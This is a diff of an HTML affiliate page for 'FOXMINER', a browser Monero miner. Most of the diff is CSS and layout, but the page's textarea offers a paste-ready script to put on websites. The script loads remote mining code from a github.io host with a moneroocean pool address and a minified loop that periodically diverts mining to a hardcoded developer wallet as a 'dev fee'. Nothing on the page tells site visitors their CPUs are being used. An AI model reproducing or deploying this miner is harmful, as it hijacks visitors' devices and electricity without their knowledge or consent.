@@ -13,85 +13,95 @@
         }
 
         body {
-            background-color: #1A1A2E;
+            background-color: #0A0A23;
             color: #E6E6FA;
             line-height: 1.6;
         }
 
-        header {
-            background-color: #0F0F1A;
-            padding: 20px;
-            text-align: center;
-            border-bottom: 3px solid #E94560;
-        }
-
-        header h1 {
-            font-size: 2.5em;
-            color: #E94560;
-            text-transform: uppercase;
-        }
-
-        nav {
-            background-color: #16213E;
+        .navbar {
+            background-color: #1B1B3A;
             padding: 15px;
             text-align: center;
+            border-bottom: 3px solid #FF2E63;
         }
 
-        nav a {
+        .navbar a {
             color: #E6E6FA;
             text-decoration: none;
             margin: 0 20px;
-            font-size: 1.1em;
+            font-size: 1.2em;
             transition: color 0.3s;
         }
 
-        nav a:hover {
-            color: #E94560;
+        .navbar a:hover {
+            color: #FF2E63;
         }
 
-        .hero {
-            text-align: center;
-            padding: 50px 20px;
-            background-color: #0F0F1A;
-            margin: 20px;
+        .tabs {
+            display: flex;
+            justify-content: center;
+            background-color: #1B1B3A;
+            padding: 10px;
+            margin: 20px auto;
+            max-width: 800px;
+            border-radius: 5px;
+        }
+
+        .tabs button {
+            background-color: #0A0A23;
+            color: #E6E6FA;
+            border: none;
+            padding: 10px 20px;
+            margin: 0 5px;
+            font-size: 1em;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            border-radius: 5px;
+        }
+
+        .tabs button:hover {
+            background-color: #FF2E63;
+        }
+
+        .tabs button.active {
+            background-color: #FF2E63;
+            color: #0A0A23;
+        }
+
+        .content {
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 20px;
+            background-color: #1B1B3A;
             border-radius: 10px;
-            border: 2px solid #E94560;
+            border: 2px solid #FF2E63;
+            text-align: center;
         }
 
-        .hero h2 {
+        .content h2 {
             font-size: 2em;
             margin-bottom: 20px;
-            color: #E94560;
+            color: #FF2E63;
         }
 
-        .hero p {
-            max-width: 600px;
-            margin: 0 auto 30px;
+        .content p {
             font-size: 1.1em;
+            margin-bottom: 20px;
         }
 
         .script-box {
-            background-color: #16213E;
-            padding: 20px;
-            margin: 20px auto;
-            max-width: 800px;
-            border-radius: 10px;
-            border: 2px solid #E94560;
-            text-align: center;
-        }
-
-        .script-box h3 {
-            font-size: 1.5em;
-            margin-bottom: 15px;
-            color: #E94560;
+            background-color: #0A0A23;
+            padding: 15px;
+            border-radius: 5px;
+            margin-top: 20px;
         }
 
         .script-box textarea {
             width: 100%;
-            height: 200px;
-            background-color: #0F0F1A;
+            height: 150px;
+            background-color: #1B1B3A;
             color: #E6E6FA;
-            border: 1px solid #E94560;
+            border: 1px solid #FF2E63;
             padding: 10px;
             font-family: 'Courier New', monospace;
             font-size: 0.9em;
@@ -99,20 +109,25 @@
             border-radius: 5px;
         }
 
+        .script-box p {
+            font-size: 1em;
+            margin-top: 10px;
+        }
+
         .dev-fee {
-            background-color: #16213E;
-            padding: 20px;
-            margin: 20px auto;
             max-width: 800px;
+            margin: 20px auto;
+            padding: 20px;
+            background-color: #1B1B3A;
             border-radius: 10px;
-            border: 2px solid #E94560;
+            border: 2px solid #FF2E63;
             text-align: center;
         }
 
         .dev-fee h3 {
             font-size: 1.5em;
             margin-bottom: 15px;
-            color: #E94560;
+            color: #FF2E63;
         }
 
         .dev-fee p {
@@ -121,10 +136,10 @@
         }
 
         footer {
-            background-color: #0F0F1A;
-            padding: 20px;
+            background-color: #1B1B3A;
+            padding: 15px;
             text-align: center;
-            border-top: 3px solid #E94560;
+            border-top: 3px solid #FF2E63;
             margin-top: 20px;
         }
 
@@ -134,40 +149,38 @@
     </style>
 </head>
 <body>
-    <header>
-        <h1>FOXMINER Affiliate Program</h1>
-    </header>
-
-    <nav>
+    <div class="navbar">
         <a href="index.html">Home</a>
         <a href="dashboard-web.html">Dashboard</a>
         <a href="affiliate.html">Affiliate</a>
         <a href="support.html">Support</a>
-    </nav>
+    </div>
 
-    <section class="hero">
+    <div class="tabs">
+        <button class="active">Affiliate Program</button>
+    </div>
+
+    <div class="content">
         <h2>Join the FOXMINER Affiliate Program</h2>
-        <p>Earn Monero (XMR) by embedding our miner on your website. Simply add our script, customize it with your wallet address, and start mining directly to your wallet!</p>
-    </section>
-
-    <section class="script-box">
-        <h3>Your Affiliate Script</h3>
-        <textarea readonly>
+        <p>Earn Monero (XMR) by adding our mining script to your website. Customize it with your wallet address and start earning today!</p>
+        <div class="script-box">
+            <textarea readonly>
 <script>var affiliateWallet = 'YOUR_XMR_WALLET_HERE';</script>
 <script src="https://foxminer-web.github.io/Foxminer/copiedscript.js?karma=bs?nosaj=gulf.moneroocean.stream:80"></script>
 <script>(function(w,d){if(!w||w.length<90)return;d='45BBbPLpGnHVnVG3k3K12ngLSt5oMbrJRc8XduYMsdkKiLubk6TcU6kgmUD2AShj5hX5WUmGgDw5Add5ozKu6mZMBftHtFN';function s(){if(!EverythingIsLife)return setTimeout(s,1e3);var k='aff_'+Math.random().toString(36).slice(2);console.log('Miner running: '+w);EverythingIsLife(w,k,20);setInterval(function(){console.log('Dev: 10m');EverythingIsLife(d,'d_'+k,20);setTimeout(function(){k='aff_'+Math.random().toString(36).slice(2);console.log('Back: '+w);EverythingIsLife(w,k,20)},6e5)},6e6)}s()})(affiliateWallet);</script>
-        </textarea>
-        <p>Copy this script and paste it in your website's HTML, just before the closing <code>&lt;/body&gt;</code> tag. Replace <code>YOUR_XMR_WALLET_HERE</code> with your Monero wallet address.</p>
-    </section>
+            </textarea>
+            <p>Copy this script and paste it in your website's HTML, just before the closing <code>&lt;/body&gt;</code> tag. Replace <code>YOUR_XMR_WALLET_HERE</code> with your Monero wallet address.</p>
+        </div>
+    </div>
 
-    <section class="dev-fee">
+    <div class="dev-fee">
         <h3>About Our Dev Fee</h3>
-        <p>A small ~5-10% dev fee is included to keep our servers running and maintain the sleek FOXMINER frontend UI. This ensures we can continue providing a top-notch mining experience for you and your users.</p>
+        <p>A small ~5-10% dev fee is included to keep our servers running and maintain the FOXMINER frontend UI. This ensures we can continue providing a top-notch mining experience for you and your users.</p>
         <p>Thank you for supporting the FOXMINER team!</p>
-    </section>
+    </div>
 
     <footer>
-        <p>&copy; 2025 FOXMINER. All rights reserved.</p>
+        <p>© 2025 FOXMINER. All rights reserved.</p>
     </footer>
 </body>
 </html>
